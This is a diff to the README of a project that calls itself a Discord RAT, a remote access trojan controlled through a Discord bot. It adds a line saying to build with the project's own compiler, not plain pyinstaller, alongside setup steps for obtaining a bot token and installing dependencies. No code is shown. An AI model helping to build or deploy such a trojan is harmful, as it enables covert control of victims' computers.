@@ -21,6 +21,7 @@ That's also why it doesn't have too many features compared to other Discord RATs
 
 ## How to use:
 - Python should be installed on the PC
+- Don't compile normally using pyinstaller, use the compiler provided
 1) [Create a Discord bot and obtain it's token](https://www.freecodecamp.org/news/create-a-discord-bot-with-python/)
 2) Download this repository as zip/dowload the release/git clone it to your PC
 3) Execute "Install Dependencies.bat"
